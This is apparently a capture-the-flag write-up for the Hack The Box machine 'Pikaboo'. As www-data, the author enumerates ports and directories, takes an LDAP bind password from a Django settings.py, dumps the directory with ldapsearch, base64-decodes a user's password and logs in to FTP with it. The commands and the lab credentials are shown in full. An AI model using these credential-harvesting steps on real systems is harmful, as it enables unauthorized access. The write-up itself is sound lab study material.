# # `Enumeration` -

```bash
www-data@pikaboo:/var/www/html/admin_staging$ ss -tupln
Netid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port                                                                                   
tcp     LISTEN   0        128              0.0.0.0:80            0.0.0.0:*       users:(("nginx",pid=607,fd=6),("nginx",pid=606,fd=6))                          
tcp     LISTEN   0        128            127.0.0.1:81            0.0.0.0:*                                                                                      
tcp     LISTEN   0        128              0.0.0.0:22            0.0.0.0:*                                                                                      
tcp     LISTEN   0        5                0.0.0.0:8000          0.0.0.0:*       users:(("python3",pid=13197,fd=3))                                             
tcp     LISTEN   0        128            127.0.0.1:389           0.0.0.0:*                                                                                      
tcp     LISTEN   0        128                 [::]:80               [::]:*       users:(("nginx",pid=607,fd=7),("nginx",pid=606,fd=7))                          
tcp     LISTEN   0        32                     *:21                  *:*                                                                                      
tcp     LISTEN   0        128                 [::]:22               [::]:*    
```

- LDAP on port 389 running that was not on nmap scans.

### Users -

```bash
www-data@pikaboo:/var/www/html/admin_staging$ cd /home
www-data@pikaboo:/home$ ls -la
total 568
drwxr-xr-x  3 root    root      4096 May 10 10:26 .
drwxr-xr-x 18 root    root      4096 Jul  9 14:44 ..
drwxr-xr-x  2 pwnmeow pwnmeow 569344 Jul  6 20:02 pwnmeow
www-data@pikaboo:/home$ cd pwnmeow/
www-data@pikaboo:/home/pwnmeow$ ls -la
total 580
drwxr-xr-x 2 pwnmeow pwnmeow  569344 Jul  6 20:02 .
drwxr-xr-x 3 root    root       4096 May 10 10:26 ..
lrwxrwxrwx 1 root    root          9 Jul  6 20:02 .bash_history -> /dev/null
-rw-r--r-- 1 pwnmeow pwnmeow     220 May 10 10:26 .bash_logout
-rw-r--r-- 1 pwnmeow pwnmeow    3526 May 10 10:26 .bashrc
-rw-r--r-- 1 pwnmeow pwnmeow     807 May 10 10:26 .profile
lrwxrwxrwx 1 root    root          9 Jul  6 20:01 .python_history -> /dev/null
-r--r----- 1 pwnmeow www-data     33 Jul 21 06:29 user.txt
```

### Checking /opt -

```bash
www-data@pikaboo:/opt$ ls -la
total 12
drwxr-xr-x  3 root root 4096 May 20 07:17 .
drwxr-xr-x 18 root root 4096 Jul  9 14:44 ..
drwxr-xr-x 10 root root 4096 Jul  6 18:58 pokeapi
www-data@pikaboo:/opt$ cd pokeapi/
www-data@pikaboo:/opt/pokeapi$ ls -la
total 104
drwxr-xr-x 10 root root 4096 Jul  6 18:58 .
drwxr-xr-x  3 root root 4096 May 20 07:17 ..
drwxr-xr-x  2 root root 4096 May 19 12:04 .circleci
-rw-r--r--  1 root root  253 Jul  6 20:17 .dockerignore
drwxr-xr-x  9 root root 4096 May 19 12:04 .git
drwxr-xr-x  4 root root 4096 May 19 12:04 .github
-rwxr-xr-x  1 root root  135 Jul  6 20:16 .gitignore
-rw-r--r--  1 root root  100 Jul  6 20:16 .gitmodules
-rw-r--r--  1 root root 3224 Jul  6 20:17 CODE_OF_CONDUCT.md
-rw-r--r--  1 root root 3857 Jul  6 20:17 CONTRIBUTING.md
-rwxr-xr-x  1 root root  184 Jul  6 20:17 CONTRIBUTORS.txt
-rw-r--r--  1 root root 1621 Jul  6 20:16 LICENSE.md
-rwxr-xr-x  1 root root 3548 Jul  6 20:16 Makefile
-rwxr-xr-x  1 root root 7720 Jul  6 20:17 README.md
drwxr-xr-x  6 root root 4096 May 19 12:04 Resources
-rw-r--r--  1 root root    0 Jul  6 20:16 __init__.py
-rw-r--r--  1 root root  201 Jul  6 20:17 apollo.config.js
drwxr-xr-x  3 root root 4096 Jul  6 20:16 config
drwxr-xr-x  4 root root 4096 May 19 12:14 data
-rw-r--r--  1 root root 1802 Jul  6 20:16 docker-compose.yml
drwxr-xr-x  4 root root 4096 May 19 12:04 graphql
-rw-r--r--  1 root root  113 Jul  6 20:16 gunicorn.py.ini
-rwxr-xr-x  1 root root  249 Jul  6 20:16 manage.py
drwxr-xr-x  4 root root 4096 May 27 05:46 pokemon_v2
-rw-r--r--  1 root root  375 Jul  6 20:16 requirements.txt
-rw-r--r--  1 root root   86 Jul  6 20:16 test-requirements.txt
```

We can see `pokeapi` directory which we also saw on the webpage on further enumeration -

```bash
www-data@pikaboo:/opt/pokeapi$ cd config/
www-data@pikaboo:/opt/pokeapi/config$ ls
__init__.py  docker-compose.py  local.py     urls.py
__pycache__  docker.py          settings.py  wsgi.py
www-data@pikaboo:/opt/pokeapi/config$ cat settings.py 
<Snip>
DATABASES = {
    "ldap": {
        "ENGINE": "ldapdb.backends.ldap",
        "NAME": "ldap:///",
        "USER": "cn=binduser,ou=users,dc=pikaboo,dc=htb",
        "PASSWORD": "J~42%W?PFHl]g",
    },
    "default": {
        "ENGINE": "django.db.backends.sqlite3",
        "NAME": "/opt/pokeapi/db.sqlite3",
    }
}
<Snip>
```

we got some creds..

### LDAP Query-

[Reference](https://ldapwiki.com/wiki/LDAP%20Query%20Basic%20Examples)

```bash
www-data@pikaboo:/opt/pokeapi$ldapsearch -D "cn=binduser,ou=users,dc=pikaboo,dc=htb" -w 'J~42%W?PFHl]g' -b 'dc=pikaboo,dc=htb' -h 127.0.0.1 -p 389 -s sub "(objectClass=*)"
# extended LDIF                                                                                                                                               
#                                                                                                                                                             
# LDAPv3                                                                                                                                                      
# base <dc=pikaboo,dc=htb> with scope subtree                                                                                                                 
# filter: (objectClass=*)                                                                                                                                     
# requesting: ALL                                                                                                                                             
#                                                                                                                                                             
                                                                                                                                                              
# pikaboo.htb                                                                                                                                                 
dn: dc=pikaboo,dc=htb                                                                                                                                         
objectClass: domain                                                                                                                                           
dc: pikaboo
<SNIP>
# pwnmeow, users, ftp.pikaboo.htb
dn: uid=pwnmeow,ou=users,dc=ftp,dc=pikaboo,dc=htb
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: pwnmeow
cn: Pwn
sn: Meow
loginShell: /bin/bash
uidNumber: 10000
gidNumber: 10000
homeDirectory: /home/pwnmeow
userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==
<SNIP>
```

We got creds - 

User - pwnmeow
Password - X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==

Its a base64 hash decoding it reveals -

```bash
root@napster:~/Documents/HTB/Pikaboo# echo "X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==" | base64 -d
_G0tT4_C4tcH_'3m_4lL!_
```

# User -

With those creds we can log in into FTP -

```bash
root@napster:~/Documents/HTB/Pikaboo# ftp 10.10.10.249
Connected to 10.10.10.249.
220 (vsFTPd 3.0.3)
Name (10.10.10.249:root): pwnmeow
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```